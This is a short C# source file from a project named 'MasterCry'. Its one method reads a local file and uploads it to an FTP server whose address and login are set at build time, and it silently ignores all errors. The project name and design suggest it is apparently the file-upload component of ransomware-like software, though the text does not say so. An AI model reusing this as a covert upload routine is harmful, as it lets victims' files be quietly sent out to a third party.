
/****************************** ghost1372.github.io ******************************\
*	Module Name:	Ftp.cs
*	Project:		MasterCry
*	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
*	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
*
*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 21, 08:37 ب.ظ
*	
***********************************************************************************/

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Cache;
using System.Text;
using System.Threading;

namespace MasterCry
{
    class Ftp
    {
        public static void UploadToFTP(string FileLocation, string FileName)
        {
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(BuildVars.FTP_SERVER + @"\" + FileName);
                request.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.CacheIfAvailable);
                request.Method = WebRequestMethods.Ftp.UploadFile;
                request.Credentials = new NetworkCredential(BuildVars.FTP_USER, BuildVars.FTP_PASS);
                // Copy the contents of the file to the request stream.  
                StreamReader sourceStream = new StreamReader(FileLocation);
                byte[] fileContents = Encoding.UTF8.GetBytes(sourceStream.ReadToEnd());
                sourceStream.Close();
                request.ContentLength = fileContents.Length;
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(fileContents, 0, fileContents.Length);
                requestStream.Close();
            }
            catch (WebException){}
            catch (Exception){}
        }

    }
}
